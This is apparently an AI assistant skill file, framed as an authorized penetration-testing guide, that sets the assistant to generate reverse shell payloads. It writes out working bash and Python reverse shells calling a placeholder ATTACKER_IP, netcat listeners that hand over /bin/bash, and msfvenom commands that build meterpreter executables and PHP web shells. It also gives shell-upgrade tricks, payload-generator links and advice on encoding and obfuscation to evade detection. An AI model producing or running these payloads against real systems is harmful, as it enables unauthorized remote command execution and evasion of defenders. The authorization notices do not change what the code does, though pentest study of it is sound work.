---
name: reverse-shell-guide
description: Guide for understanding and generating reverse shell payloads in authorized penetration testing and security research. Use this skill when the user needs to create reverse shell payloads for security testing, understand reverse shell concepts, work with MSFVenom, or troubleshoot shell connections. Trigger for any request about reverse shells, payload generation, post-exploitation access, or security testing that involves establishing remote command execution.
---

# Reverse Shell Guide

A comprehensive guide for security professionals working with reverse shells in authorized penetration testing and security research contexts.

## ⚠️ Legal and Ethical Notice

**Only use reverse shells in environments where you have explicit written authorization.** Unauthorized access to computer systems is illegal in most jurisdictions. This skill is designed for:

- Authorized penetration testing engagements
- Security research in controlled lab environments
- Educational purposes with proper permissions
- Bug bounty programs with clear scope

## What is a Reverse Shell?

A reverse shell is a technique where the target system initiates a connection back to the attacker's machine, rather than the attacker connecting to the target. This is useful when:

- The target is behind a firewall/NAT
- Inbound connections are blocked but outbound are allowed
- You need persistent access to a compromised system

## Core Concepts

### Connection Flow

```
[Attacker Machine] ← Connection ← [Target System]
     Port: 4444              Process: shell
```

1. Attacker sets up a listener on a port
2. Target executes payload that connects back
3. Interactive shell session established

### Common Languages

- **Bash** - Linux/Unix systems
- **Python** - Cross-platform
- **PowerShell** - Windows systems
- **Netcat** - Network utility
- **PHP** - Web servers

## Quick Reference

### Bash Reverse Shell

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# One-liner for payload
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

### Python Reverse Shell

```python
# Python 3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
```

### Netcat Listener

```bash
# Basic listener
nc -lvnp PORT

# With verbose output
nc -lvnp PORT -v

# With executable shell
nc -lvnp PORT -e /bin/bash
```

## MSFVenom Payload Generation

### Basic Commands

```bash
# Generate meterpreter reverse TCP payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > payload.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > payload.elf

# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
```

### Common Payload Formats

| Format | Flag | Use Case |
|--------|------|----------|
| exe | `-f exe` | Windows executable |
| elf | `-f elf` | Linux executable |
| raw | `-f raw` | Raw payload for embedding |
| php | `-f php` | PHP web shell |
| asp | `-f asp` | ASP web shell |
| js | `-f js` | JavaScript payload |

## Getting a Full TTY

After obtaining a basic shell, upgrade to a full TTY for better functionality:

```bash
# Method 1: Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Method 2: Perl
perl -e 'exec "/bin/bash -i";'

# Method 3: Stty
stty raw -echo; fg
reset
stty rows 40 cols 120

# Method 4: Script
script -q /dev/null -c /bin/bash
```

## Online Resources

### Auto-Generated Shell Generators

- **reverse-shell.sh** - https://reverse-shell.sh/
- **revshells.com** - https://www.revshells.com/
- **Shellerator** - https://github.com/ShutdownRepo/shellerator
- **ShellPop** - https://github.com/0x00-0x00/ShellPop
- **ShellReverse** - https://github.com/cybervaca/ShellReverse

### Additional Tools

- **pyminifier** - https://liftoff.github.io/pyminifier/
- **xc** - https://github.com/xct/xc/
- **revshellgen** - https://github.com/t0thkr1s/revshellgen
- **rsg** - https://github.com/mthbernardes/rsg

## Troubleshooting

### Connection Issues

1. **Check firewall** - Ensure port is open on attacker machine
2. **Verify IP** - Use correct external IP for LHOST
3. **Port conflicts** - Ensure no other process is using the port
4. **SELinux/AppArmor** - May block shell execution on target

### Shell Quality Issues

1. **No tab completion** - Upgrade to full TTY
2. **Commands fail silently** - Check PATH, use full paths
3. **Connection drops** - Use persistent shells or reconnection logic
4. **Encoding issues** - Set proper locale and encoding

## Best Practices

### For Security Testing

1. **Document everything** - Keep detailed logs of all activities
2. **Minimize impact** - Use read-only operations when possible
3. **Clean up** - Remove all payloads and access points after testing
4. **Report findings** - Provide clear remediation guidance

### Payload Evasion

1. **Encoding** - Use base64 or other encoding to avoid detection
2. **Obfuscation** - Minify and obfuscate scripts
3. **Timing** - Consider delayed execution for testing
4. **Variety** - Use multiple payload types to test defenses

## When to Use This Skill

Use this skill when:

- You need to generate a reverse shell payload for authorized testing
- You're troubleshooting a reverse shell connection
- You need to understand reverse shell concepts
- You're working with MSFVenom or similar tools
- You need to upgrade a basic shell to a full TTY
- You're documenting penetration testing procedures
- You're researching security controls against reverse shells

## Safety Checklist

Before executing any reverse shell:

- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Legal review completed
- [ ] Backup/recovery plan in place
- [ ] Monitoring/logging configured
- [ ] Communication channel established with stakeholders
- [ ] Cleanup procedure documented
